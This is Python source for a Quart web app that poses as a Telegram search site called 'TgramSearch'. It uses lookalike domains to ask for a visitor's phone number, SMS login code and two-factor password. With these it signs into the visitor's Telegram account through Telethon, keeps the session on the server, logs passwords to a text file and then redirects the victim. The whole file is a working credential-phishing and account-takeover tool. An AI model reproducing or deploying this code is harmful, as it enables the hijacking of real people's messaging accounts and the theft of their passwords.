import filetype
from os import path, remove
import os
from dotenv import load_dotenv

from quart import Quart, render_template, request, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, \
    PasswordHashInvalidError, SendCodeUnavailableError

# Load environment variables first
load_dotenv()

# Initialize Quart app with static folder configuration
app = Quart(__name__, static_folder='static')

# Get configuration from environment variables
API_ID = int(os.getenv('API_ID', '1891354'))
API_HASH = os.getenv('API_HASH', '7e8edd54e1b085bfb29af43c11c6c00e')
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
REDIRECT_URL = os.getenv('REDIRECT_URL', 'https://tgramsearch.com/')

# Verify required environment variables
if not all([API_ID, API_HASH, BOT_TOKEN]):
    raise ValueError("Missing required environment variables. Please check .env file.")

# Static configuration
img = '/static/images/logo.png'
bg_link = 'https://tgramsearch.com/'
link = 'http://tgrammsearch.ru/'
name = 'TgramSearch'
site = 'tgramsearch.ru'

# Store sessions
SESSIONS = {}

def delete(filename):
    if path.exists(filename):
        remove(filename)


async def build_client(session_name):
    session = TelegramClient(
        api_hash=API_HASH,
        api_id=API_ID,
        session=session_name
    )
    await session.connect()
    return session


@app.route("/", methods=['get'])
async def auth():
    return await render_template('auth.html', img=img, link=link, bg_link=bg_link)


@app.route("/phone_form", methods=['get'])
async def login():
    return await render_template('phone_form.html', img=img, link=link, bg_link=bg_link, name=name, site=site)

@app.route("/phone_form", methods=['post'])
async def get_phone_number():
    phone_code = (await request.form).get('phone-code').lstrip("+")
    phone = (await request.form).get('phone').replace(' ', '')
    phone_number = str(phone_code) + str(phone)
    SESSIONS[phone_number] = await build_client(
        phone_number
    )

    try:
        await SESSIONS[phone_number].send_code_request(phone=phone_number, force_sms=True)
    
    except SendCodeUnavailableError:
        return await render_template("submit_code.html", phone=phone_number, img=img, link=link, bg_link=bg_link,
                                     name=name, site=site)

    except Exception as e:
        print(e)
        if session := SESSIONS.get(phone_number):
            SESSIONS.pop(phone_number)
            await session.disconnect()
            delete(phone_number + ".session")
        return await render_template("phone_form.html",
                                     error="This number is not registered in Telegram", img=img, link=link, bg_link=bg_link, name=name, site=site)
    return await render_template("submit_code.html", phone=phone_number, img=img, link=link, bg_link=bg_link, name=name, site=site)
 


@app.route("/submit/<phone>", methods=['post'])
async def submit_code(phone: str):
    code = (await request.form).get("code")

    try:
        await SESSIONS[phone].sign_in(phone='+' + phone, code=code)
    except SessionPasswordNeededError:
        return await render_template("submit_password.html", phone=phone, img=img, link=link, bg_link=bg_link, name=name, site=site)
    except KeyError:
        return await render_template("phone_form.html",
                                     error="Invalid phone number")
    except PhoneCodeInvalidError as e:
        return await render_template("submit_code.html", phone=phone, error="Entered code not valid", img=img, link=link, bg_link=bg_link, name=name, site=site)
    return redirect(REDIRECT_URL)



@app.route("/submitpassword/<phone>", methods=['post'])
async def submit_password(phone: str):
    password = (await request.form).get("password")

    try:
        await SESSIONS[phone].sign_in(phone='+' + phone, password=password)
        with open(f'{phone}.txt', 'a') as file:
            file.write(password + '\n')
    except KeyError:
        return await render_template("phone_form.html", error="Incorrect phone number.", img=img, link=link, bg_link=bg_link, name=name, site=site)
    except PasswordHashInvalidError as e:
        return await render_template("submit_password.html", phone=phone, error="Password incorrect.", img=img, link=link, bg_link=bg_link, name=name, site=site)

    return redirect(REDIRECT_URL)


if __name__ == '__main__':
    import waitress
    waitress.serve(app, host='0.0.0.0', port=8080)
